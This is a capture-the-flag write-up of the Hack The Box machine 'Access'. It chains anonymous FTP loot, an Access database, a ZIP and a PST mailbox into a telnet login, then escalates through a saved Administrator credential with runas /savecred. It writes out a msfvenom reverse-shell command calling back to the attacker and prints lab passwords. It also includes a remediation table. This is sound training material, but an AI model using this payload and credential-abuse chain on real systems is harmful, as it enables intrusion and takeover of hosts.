# Access — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | 🪟 Windows Server 2008 R2 |
| **Difficulty** | 🟢 Easy |
| **Owned** | 01/10/2026 |
| **Author** | Maksym S |

> ⚠️ Retired machine. Flags are redacted (`HTB{__REDACTED__}`) in line with the HTB Terms of Service.

---

## 📌 Summary

**Access** is a credential-chaining box. Anonymous FTP hands over a Microsoft Access database and a
password-protected ZIP; the database password opens the ZIP, which contains a PST (Outlook) mailbox
whose one email leaks the `security` account's telnet password. The privilege escalation is the real
lesson: a stored credential for `ACCESS\Administrator` sits in Credential Manager, and
`runas /savecred` runs a payload as Administrator **without ever knowing the password** — a
five-second `cmdkey /list` check that I reached only after a long detour (see Lessons Learned).

**Attack path:** `anon FTP → backup.mdb (creds) → unzip "Access Control.zip" → PST email → telnet as security → cmdkey /list (saved Administrator cred) → runas /savecred → Administrator`

---

## 🔍 1. Reconnaissance

### Port scan

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
23/tcp open  telnet  Microsoft Windows XP telnetd
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
```

| Port | Service | Notes |
|-----:|---------|-------|
| 21   | ftp     | **anonymous login allowed** |
| 23   | telnet  | NTLM info → host/domain `ACCESS` |
| 80   | http    | IIS 7.5, "MegaCorp" site |

Telnet open on a Windows box is unusual and a strong hint it's the intended login channel once creds
are found. `systeminfo` later confirms Windows Server 2008 R2 (6.1.7600).

---

## 🧭 2. Enumeration

### Anonymous FTP

```bash
ftp 10.129.76.235      # user: anonymous, blank password
```

Two directories: `Backups/` with `backup.mdb`, and `Engineer/` with `Access Control.zip`. Pull both
(use `binary` mode — `backup.mdb` is a binary database and ASCII mode mangles it):

```
ftp> binary
ftp> get backup.mdb
ftp> get "Access Control.zip"
```

### backup.mdb → credentials

`backup.mdb` is a Microsoft **Access** database — read it offline with `mdbtools`, no Windows needed:

```bash
mdb-tables backup.mdb                       # list tables
mdb-export backup.mdb auth_user             # dump the user table
```

Among the tables is one holding application accounts; the useful row is the **`security`** account
with password **`access4u@security`**.

### Access Control.zip → PST → telnet password

The ZIP is password-protected. The database password opens it:

```bash
7z x "Access Control.zip"                    # password: access4u@security
```

Inside is `Access Control.pst` — an Outlook mailbox. Convert and read it:

```bash
readpst "Access Control.pst"                 # → Access Control.mbox
```

One email (from `john@megacorp.com`) gives up the telnet password:

> The password for the "security" account has been changed to **4Cc3ssC0ntr0ller**.

---

## 🎯 3. Foothold — telnet as `security`

```bash
telnet 10.129.76.235        # login: security / 4Cc3ssC0ntr0ller
```

```
C:\Users\security> whoami
access\security
```

`user.txt` is on `security`'s desktop.

---

## ⬆️ 4. Privilege Escalation — stored Administrator credential

`security` has only `SeChangeNotifyPrivilege` — no Potato path. The win is Credential Manager:

```
C:\> cmdkey /list

Currently stored credentials:
    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

A credential for **`ACCESS\Administrator`** is saved. `runas /savecred` will launch a program as that
user using the stored secret — you never need the password. Because `runas` spawns a **separate,
non-interactive** console, point it at a self-contained **reverse-shell payload** (not an interactive
`cmd`, whose output you'd never see):

```bash
# attacker: generate a reverse shell and host it + a listener (Penelope / nc)
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o reverse.exe
```

```cmd
:: on target, after fetching reverse.exe to C:\temp
runas /user:ACCESS\Administrator /savecred "C:\temp\reverse.exe"
```

The listener catches a shell as `access\administrator`:

```
whoami
access\administrator
```

`root.txt` is in `C:\Users\Administrator\Desktop`.

---

## 🚩 Proof

```
user.txt: HTB{__REDACTED__}
root.txt: HTB{__REDACTED__}
```

---

## 🧠 Lessons Learned

- **What worked:** The whole foothold is offline credential archaeology — `mdbtools` + `7z` +
  `readpst` turn three leaked files into a telnet login without touching an exploit.
- **Rabbit holes (the expensive mistake):** After the `security` shell I spent the bulk of the box
  chasing privesc through the installed **ZKAccess3.5** application and SQL Server — the
  `README_FIRST.txt` with an `sa` password (`htrcy@HXeryNJ…`), the numbered `.sql`/`.vbs` setup
  scripts, `PrivescCheck.ps1`, `runas` as `sa`/`sysdba`, even `net use \\127.0.0.1\C$` password
  guessing. **None of it mattered.** The log timeline is brutal: the one command that solved the box,
  `cmdkey /list`, wasn't run until the very end of the session.
- **OSCP takeaway:** On any Windows foothold, run the cheap, universal credential checks **before**
  enumerating installed applications: `whoami /priv /all`, then **`cmdkey /list`**. A stored
  credential is an instant, password-free privesc via `runas /savecred`. A conspicuous vendor app
  directory (here `C:\ZKTeco\ZKAccess3.5`) is bait — its config files and setup docs are a tar pit
  until you've exhausted the one-liners. Added `cmdkey /list` to my
  [Windows methodology](../../Methodology/Windows.md#stored-credentials--cmdkey-list--runas-savecred).

---

## 🛡️ Remediation

| Finding | Severity | Fix |
|---------|:--------:|-----|
| Anonymous FTP exposing `backup.mdb` / `Access Control.zip` | High | Disable anonymous FTP; never expose backups or credential-bearing files on a reachable share. |
| Credentials reused across DB / ZIP / telnet account | High | Unique secrets per system; don't ship passwords in mailboxes/backups. |
| Telnet (cleartext) exposed | Medium | Disable telnet; use SSH/RDP with NLA. |
| `ACCESS\Administrator` credential stored in Credential Manager on a low-priv-accessible account | Critical | Don't save privileged creds with `/savecred`; remove with `cmdkey /delete`. |

---

## 🔗 References

- [mdbtools — reading Access `.mdb` files](https://github.com/mdbtools/mdbtools)
- [`readpst` (libpst) — converting Outlook PST](https://www.five-ten-sg.com/libpst/)
- [Microsoft Docs — `cmdkey`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)
- [Microsoft Docs — `runas` (`/savecred`)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/runas)
